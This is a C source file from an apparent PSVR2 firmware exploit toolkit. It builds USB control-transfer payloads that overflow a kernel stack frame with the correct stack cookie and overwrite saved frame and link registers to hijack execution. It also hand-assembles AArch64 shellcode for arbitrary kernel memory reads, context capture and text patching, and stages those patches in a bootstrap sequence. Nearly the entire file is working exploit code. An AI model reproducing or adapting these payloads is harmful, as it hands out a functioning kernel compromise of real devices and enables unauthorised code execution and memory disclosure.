#include "psvr2/kernel_payload.h"
#include "firmware_0600_internal.h"

#include "psvr2/arm64.h"

#include <string.h>

_Static_assert(PSVR2_AUTH_COOKIE_PROBE_SIZE == 72U,
               "authentication cookie probe must stop before saved X29");

enum {
    COLD_INSTRUCTIONS_OFFSET = 0x04,
    COLD_TARGETS_OFFSET = 0xa0,
    COLD_DESCRIPTOR_OFFSET = 0x1d8,
    COLD_DESCRIPTOR_SIZE = 0x24,
    COLD_PATCH_CAPACITY =
        (COLD_DESCRIPTOR_OFFSET - COLD_TARGETS_OFFSET) /
        sizeof(uint64_t)
};

_Static_assert(COLD_INSTRUCTIONS_OFFSET % sizeof(uint32_t) == 0,
               "cold instruction table alignment");
_Static_assert(COLD_TARGETS_OFFSET % sizeof(uint64_t) == 0,
               "cold target table alignment");
_Static_assert(COLD_DESCRIPTOR_OFFSET % sizeof(uint64_t) == 0,
               "cold descriptor alignment");
_Static_assert(COLD_DESCRIPTOR_OFFSET + COLD_DESCRIPTOR_SIZE <=
                   PSVR2_COLD_BOOTSTRAP_STAGE_SIZE,
               "cold descriptor must fit the static report slot");

size_t psvr2_build_tlbi_payload(
    const psvr2_constants *constants,
    uint8_t out[PSVR2_TLBI_PAYLOAD_SIZE], uint64_t next,
    uint64_t x19, uint64_t x20, uint64_t x21) {
    if (!constants || !out || !next || !x20 || !x21) return 0;

    memset(out, 0, PSVR2_TLBI_PAYLOAD_SIZE);
    out[0] = UINT8_C(0xf0);
    out[1] = UINT8_C(0x02);
    psvr2_store_le64(out + 64, constants->fw.stack_cookie);
    psvr2_store_le64(out + 80, constants->fw.tlbi_gadget);
    psvr2_store_le64(out + 96, next);
    psvr2_store_le64(out + 104, x19);
    psvr2_store_le64(out + 112, x20);
    psvr2_store_le64(out + 120, x21);
    return PSVR2_TLBI_PAYLOAD_SIZE;
}

size_t psvr2_build_auth_cookie_probe(
    const psvr2_constants *constants, bool corrupt_cookie,
    uint8_t out[PSVR2_AUTH_COOKIE_PROBE_SIZE]) {
    if (!constants || !out) return 0;

    memset(out, 0, PSVR2_AUTH_COOKIE_PROBE_SIZE);
    out[0] = UINT8_C(0xf0);
    out[1] = UINT8_C(0x02);
    uint64_t cookie = constants->fw.stack_cookie;
    if (corrupt_cookie) cookie ^= UINT64_C(1);
    psvr2_store_le64(out + 64, cookie);
    return PSVR2_AUTH_COOKIE_PROBE_SIZE;
}

size_t psvr2_build_text_patch_payload(
    const psvr2_constants *constants,
    uint8_t out[PSVR2_TEXT_PATCH_PAYLOAD_SIZE],
    uint64_t target, uint32_t instruction,
    const psvr2_registers *registers) {
    if (!constants || !out || !registers || !registers->valid ||
        !registers->mep || !registers->x21)
        return 0;

    memset(out, 0, PSVR2_TEXT_PATCH_PAYLOAD_SIZE);
    out[0] = UINT8_C(0xf0);
    out[1] = UINT8_C(0x01);

    /*
     * The 200-byte report ends immediately before the untouched giveback
     * frame. The helper reconstructs the endpoint pointer, preserves the
     * observed endpoint state byte, and resumes the normal completion unwind.
     */
    psvr2_store_le64(out + 64, constants->fw.stack_cookie);
    psvr2_store_le64(out + 80, constants->fw.patch_helper);
    psvr2_store_le64(out + 88, instruction);
    psvr2_store_le64(out + 96, target);
    psvr2_store_le64(out + 104, registers->x21);
    psvr2_store_le64(out + 112, registers->x22);
    psvr2_store_le64(out + 192, constants->fw.stack_cookie);
    return PSVR2_TEXT_PATCH_PAYLOAD_SIZE;
}

size_t psvr2_build_direct_read_payload(
    const psvr2_constants *constants,
    uint8_t out[PSVR2_DIRECT_READ_PAYLOAD_SIZE],
    uint64_t target, uint64_t helper) {
    if (!constants || !out || !target ||
        (helper != constants->fw.direct_read_helper &&
         helper != constants->fw.direct_read_helper + UINT64_C(20) &&
         helper != constants->fw.direct_read_helper + UINT64_C(40) &&
         helper != constants->fw.free_helper))
        return 0;

    memset(out, 0, PSVR2_DIRECT_READ_PAYLOAD_SIZE);
    out[0] = UINT8_C(0xf0);
    out[1] = UINT8_C(0x02);
    psvr2_store_le64(out + 64, constants->fw.stack_cookie);
    /*
     * Mode 2 starts in usb_auth_ctrl_complete's own 0x80-byte frame.
     * Offsets 72/80 therefore replace only usb_gadget_giveback_request's
     * saved X29/LR.  Its 16-byte unwind leaves SP at the untouched MTU3
     * frame, with X19=req and X20-X22 holding the live endpoint state.
     */
    psvr2_store_le64(out + 72, target);
    psvr2_store_le64(out + 80, helper);
    return PSVR2_DIRECT_READ_PAYLOAD_SIZE;
}

bool psvr2_build_direct_read_helper(
    const psvr2_constants *constants,
    uint8_t out[PSVR2_DIRECT_READ_SC_SIZE]) {
    enum {
        copy_width = 16,
        copy_iterations = PSVR2_DIRECT_READ_BLOCK_SIZE / copy_width
    };
    _Static_assert(
        PSVR2_DIRECT_READ_BLOCK_SIZE % copy_width == 0,
        "direct-read block must be an integer number of LDP/STP copies");
    _Static_assert(
        PSVR2_AUTH_RESPONSE_HEADER_SIZE <
            PSVR2_COMPOSITE_EP0_TRANSFER_LIMIT,
        "auth header must leave room for a direct-read payload");
    _Static_assert(
        copy_iterations > 0,
        "direct-read loop must copy at least one block");
    _Static_assert(
        copy_iterations <= UINT16_MAX,
        "direct-read loop count must fit an AArch64 MOVZ immediate");
    if (!constants || !out) return false;
    memset(out, 0, PSVR2_DIRECT_READ_SC_SIZE);

    uint32_t branch;
    const uint32_t setup[] = {
        UINT32_C(0xf9400260), /* ldr x0,[x19] -- req->buf */
        UINT32_C(0x91004000)  /* add x0,x0,#0x10 */
    };

    /* One-byte entry, used at page edges and for short tails. */
    psvr2_store_le32(out + 0, setup[0]);
    psvr2_store_le32(out + 4, setup[1]);
    psvr2_store_le32(out + 8, UINT32_C(0x394003a1)); /* ldrb w1,[x29] */
    psvr2_store_le32(out + 12, UINT32_C(0x39000001)); /* strb w1,[x0] */
    if (!psvr2_arm64_branch(
            constants->fw.direct_read_helper + 16,
            constants->fw.mtu3_complete_resume, false, &branch))
        return false;
    psvr2_store_le32(out + 16, branch);

    /* Eight-byte entry for the common unaligned in-page case. */
    psvr2_store_le32(out + 20, setup[0]);
    psvr2_store_le32(out + 24, setup[1]);
    psvr2_store_le32(out + 28, UINT32_C(0xf94003a1)); /* ldr x1,[x29] */
    psvr2_store_le32(out + 32, UINT32_C(0xf9000001)); /* str x1,[x0] */
    if (!psvr2_arm64_branch(
            constants->fw.direct_read_helper + 20 + 16,
            constants->fw.mtu3_complete_resume, false, &branch))
        return false;
    psvr2_store_le32(out + 36, branch);

    /*
     * Block entry. The host selects it only when the complete source range is
     * inside one caller-checked page. Header plus payload is exactly the
     * bounded libcomposite EP0 transfer limit.
     */
    psvr2_store_le32(out + 40, setup[0]);
    psvr2_store_le32(out + 44, setup[1]);
    const uint32_t block[] = {
        UINT32_C(0xaa1d03e1), /* mov x1,x29 */
        UINT32_C(0xd2800002) |
            ((uint32_t)copy_iterations << 5), /* mov x2,#iterations */
        UINT32_C(0xa8c11023), /* ldp x3,x4,[x1],#16 */
        UINT32_C(0xa8811003), /* stp x3,x4,[x0],#16 */
        UINT32_C(0xf1000442), /* subs x2,x2,#1 */
        UINT32_C(0x54ffffa1)  /* b.ne block loop */
    };
    for (size_t index = 0; index < PSVR2_ARRAY_LEN(block); ++index)
        psvr2_store_le32(out + 48 + index * 4U, block[index]);
    if (!psvr2_arm64_branch(
            constants->fw.direct_read_helper + 40 + 32,
            constants->fw.mtu3_complete_resume, false, &branch))
        return false;
    psvr2_store_le32(out + 72, branch);
    return true;
}

bool psvr2_build_direct_context_helper(
    const psvr2_constants *constants,
    uint8_t out[PSVR2_DIRECT_CONTEXT_SC_SIZE]) {
    if (!constants || !out) return false;
    uint32_t branch;
    psvr2_store_le32(out + 0, UINT32_C(0xf9400260)); /* ldr x0,[x19] */
    psvr2_store_le32(
        out + 4, UINT32_C(0xa9015013)); /* stp x19,x20,[x0,#0x10] */
    psvr2_store_le32(
        out + 8, UINT32_C(0xa9025815)); /* stp x21,x22,[x0,#0x20] */
    if (!psvr2_arm64_branch(
            constants->fw.free_helper + 12,
            constants->fw.mtu3_complete_resume, false, &branch))
        return false;
    psvr2_store_le32(out + 12, branch);
    return true;
}

static bool append_cold_patch(
    uint8_t stage[PSVR2_COLD_BOOTSTRAP_STAGE_SIZE],
    size_t *count, uint64_t target, uint32_t instruction) {
    if (!stage || !count || *count >= COLD_PATCH_CAPACITY ||
        COLD_INSTRUCTIONS_OFFSET +
                (*count + 1U) * sizeof(uint32_t) >
            COLD_TARGETS_OFFSET)
        return false;
    psvr2_store_le64(
        stage + COLD_TARGETS_OFFSET +
        *count * sizeof(uint64_t), target);
    psvr2_store_le32(
        stage + COLD_INSTRUCTIONS_OFFSET +
        *count * sizeof(uint32_t),
        instruction);
    ++*count;
    psvr2_store_le32(
        stage + COLD_DESCRIPTOR_OFFSET + 0x10,
        (uint32_t)*count);
    return true;
}

bool psvr2_build_cold_cleanup_helper(
    const psvr2_constants *constants, uint64_t address,
    uint8_t out[PSVR2_COLD_CLEANUP_SIZE]) {
    if (!constants || !out ||
        (address != constants->fw.cold_cleanup_helper &&
         address != constants->fw.batch_patch_helper))
        return false;

    memset(out, 0, PSVR2_COLD_CLEANUP_SIZE);
    uint32_t branch;
    psvr2_store_le32(
        out + 0, UINT32_C(0xf9400e60)); /* ldr x0,[x19,#0x18] */
    psvr2_store_le32(
        out + 4, UINT32_C(0xb9402261)); /* ldr w1,[x19,#0x20] */
    if (!psvr2_arm64_branch(
            address + 8, constants->fw.patch_text, true, &branch))
        return false;
    psvr2_store_le32(out + 8, branch);
    psvr2_store_le32(
        out + 12, UINT32_C(0xf9403eb4)); /* ldr x20,[x21,#0x78] */
    psvr2_store_le32(
        out + 16, UINT32_C(0xaa1503e0)); /* mov x0,x21 */
    if (!psvr2_arm64_branch(
            address + 20, constants->fw.raw_spin_lock, true, &branch))
        return false;
    psvr2_store_le32(out + 20, branch);
    psvr2_store_le32(
        out + 24,
        UINT32_C(0x39033696)); /* strb w22,[x20,#0xcd] */
    if (!psvr2_arm64_branch(
            address + 28,
            constants->fw.mtu3_ep0_isr_epilogue, false, &branch))
        return false;
    psvr2_store_le32(out + 28, branch);
    return true;
}

bool psvr2_build_cold_bootstrap(
    const psvr2_constants *constants,
    uint8_t stage[PSVR2_COLD_BOOTSTRAP_STAGE_SIZE],
    uint8_t payload[PSVR2_COLD_BOOTSTRAP_PAYLOAD_SIZE]) {
    if (!constants || !stage || !payload ||
        (constants->version != PSVR2_FW_0110 &&
         constants->version != PSVR2_FW_0600))
        return false;

    uint8_t direct_context[PSVR2_DIRECT_CONTEXT_SC_SIZE];
    uint8_t direct_read[PSVR2_DIRECT_READ_SC_SIZE];
    uint8_t patch[PSVR2_PATCH_SC_SIZE];
    if (!psvr2_build_direct_context_helper(constants, direct_context) ||
        !psvr2_build_direct_read_helper(constants, direct_read) ||
        !psvr2_build_patch_helper(constants, patch))
        return false;

    uint8_t cleanup[PSVR2_COLD_CLEANUP_SIZE];
    uint32_t branch;
    if (!psvr2_build_cold_cleanup_helper(
            constants, constants->fw.cold_cleanup_helper, cleanup))
        return false;

    memset(stage, 0, PSVR2_COLD_BOOTSTRAP_STAGE_SIZE);
    stage[0] = (uint8_t)constants->fw.cold_static_slot;
    psvr2_store_le64(
        stage + COLD_DESCRIPTOR_OFFSET,
        constants->fw.cold_static_stage + COLD_TARGETS_OFFSET);
    psvr2_store_le64(
        stage + COLD_DESCRIPTOR_OFFSET + 8,
        constants->fw.cold_static_stage + COLD_INSTRUCTIONS_OFFSET);
    psvr2_store_le64(
        stage + COLD_DESCRIPTOR_OFFSET + 0x18,
        constants->fw.cold_patch_exit);
    psvr2_store_le32(
        stage + COLD_DESCRIPTOR_OFFSET + 0x20,
        constants->fw.cold_patch_exit_original);
    size_t count = 0;
    for (size_t offset = 0; offset < sizeof(cleanup); offset += 4)
        if (!append_cold_patch(
                stage, &count, constants->fw.cold_cleanup_helper + offset,
                psvr2_load_le32(cleanup + offset)))
            return false;
    for (size_t offset = 0; offset < sizeof(direct_context); offset += 4)
        if (!append_cold_patch(
                stage, &count, constants->fw.free_helper + offset,
                psvr2_load_le32(direct_context + offset)))
            return false;
    for (size_t offset = 0; offset < sizeof(direct_read); offset += 4)
        if (psvr2_load_le32(direct_read + offset) != 0 &&
            !append_cold_patch(
                 stage, &count, constants->fw.direct_read_helper + offset,
                 psvr2_load_le32(direct_read + offset)))
            return false;
    for (size_t offset = 0; offset < sizeof(patch); offset += 4)
        if (!append_cold_patch(
                stage, &count, constants->fw.patch_helper + offset,
                psvr2_load_le32(patch + offset)))
            return false;
    if (!psvr2_arm64_branch(
            constants->fw.cold_patch_exit,
            constants->fw.cold_cleanup_helper,
            false, &branch) ||
        !append_cold_patch(
            stage, &count, constants->fw.cold_patch_exit, branch))
        return false;

    memset(payload, 0, PSVR2_COLD_BOOTSTRAP_PAYLOAD_SIZE);
    payload[0] = UINT8_C(0xf0);
    payload[1] = UINT8_C(0x02);
    psvr2_store_le64(payload + 64, constants->fw.stack_cookie);
    psvr2_store_le64(payload + 80, constants->fw.cold_patch_epilogue);
    psvr2_store_le64(payload + 96, constants->fw.cold_patch_loop);
    psvr2_store_le64(
        payload + 104,
        constants->fw.cold_static_stage + COLD_DESCRIPTOR_OFFSET);
    return true;
}
